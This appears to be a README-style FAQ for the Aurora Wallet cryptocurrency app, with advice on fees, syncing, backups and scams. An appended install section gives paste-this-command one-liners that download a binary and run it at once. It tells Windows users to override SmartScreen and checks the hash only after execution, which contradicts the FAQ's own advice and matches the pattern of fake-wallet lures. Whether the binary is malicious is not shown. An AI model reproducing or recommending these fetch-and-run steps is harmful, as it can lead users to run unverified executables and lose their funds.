![Aurora Wallet FAQ guide](assets/aurora-wallet-guide-article-banner.png)

# Auroracoin and Aurora Wallet FAQ

The questions that arrive most often, answered in the order people ask them.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


Fees, syncing, backups, recovery and the old repositories: the short answers, with a link to the long one.

Aurora Wallet is a desktop application with no account, no server and no support desk, so most questions are answered by the software itself. The answers below point at the article that covers each one properly.

<!-- ARTICLE-BODY-BEGIN -->

## Getting the wallet

The wallet is free and open source, and the only place to download it is the release page of the wallet repository. Windows takes the `.exe`, macOS takes the `.dmg` and Linux takes the `.zip` that contains the `aurora-wallet` binary. Compare the SHA-256 value before you run anything, because the release page is where the real values are published.

## Fees and transactions

Every send carries a small fee paid to the miner that confirms it. The Foundation takes nothing, and the wallet shows the fee before you confirm. A transfer that sits at zero confirmations is waiting for a block rather than failing, and it must not be resent until you have checked whether the network received it.

## Sync and balance

A balance of zero is almost always a sync that has not finished or a wallet following the wrong chain. Let the wallet reach one hundred percent, compare its height with a public explorer and only then judge the number. A peer count of zero is a network problem, and the wallet talks to peers on a fixed port that a firewall can block.

## Backups and recovery

The recovery phrase restores the keys on any compatible machine, and the wallet file restores the labels and address book. Keep both, in separate places, and test one restore so you know the backup works. A password protects the wallet file and is not a recovery method.

## Old holdings

A legacy `wallet.dat`, a paper wallet key and a WIF private key all move into the modern wallet. Importing keeps the original address; sweeping moves the balance to an address your phrase controls, which is the better choice for a key that has been stored on paper for years.

## Security

Nobody legitimate asks for your recovery phrase. A message claiming to be support and offering a fix is the start of a theft attempt, and the only safe reply is none. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/35-phishing-seed-scams.md">Phishing and seed scams</a> lists the shapes those messages take.

Downloads come from the release page, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/10-spot-fake-wallet-downloads.md">spotting fake downloads</a> covers the lookalike domains.

## Which version to run

Run the newest release, because fixes and compatibility arrive there. The installed version is in the About window, and the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> page lists the installers and the checksums.

The application itself is covered in <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/01-what-is-aurora-wallet.md">what Aurora Wallet is</a>, including the first run and the address book.

The one habit that prevents a fake install is covered in <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/06-verify-sha256-checksums.md">the checksum guide</a> with the commands for each system.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [What is Aurora Wallet](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/01-what-is-aurora-wallet.md)
- [Wallet not syncing](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/11-wallet-not-syncing.md)
- [Backup best practice](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/33-backup-best-practice.md)
- [What is Auroracoin](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/37-what-is-auroracoin-aur.md)
